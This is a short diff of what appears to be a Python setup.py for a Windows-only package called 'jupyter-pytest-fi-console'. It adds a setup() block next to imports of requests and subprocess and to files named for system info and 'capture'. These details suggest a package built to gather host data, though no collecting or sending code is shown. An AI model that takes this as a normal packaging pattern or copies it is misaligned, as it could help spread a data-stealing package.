@@ -12,7 +12,21 @@ import requests
 import subprocess
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                   
+setup(
+name='jupyter-pytest-fi-console',
+version='8.7.5',
+author='liamobrien',
+author_email='liamobrien@fractureinteractive.com',
+description='Jupyter terminal console with integreted simple pytest platform',
+packages=find_packages(),
+install_requires=['psutil==5.9.2'],
+classifiers=[
+'Programming Language :: Python :: 3',
+'License :: OSI Approved :: MIT License',
+'Operating System :: Microsoft :: Windows ',
+],
+python_requires='>=3.6'
+)
 
 sysinfo = "ap14847.txt"
 capture = "capture.txt"
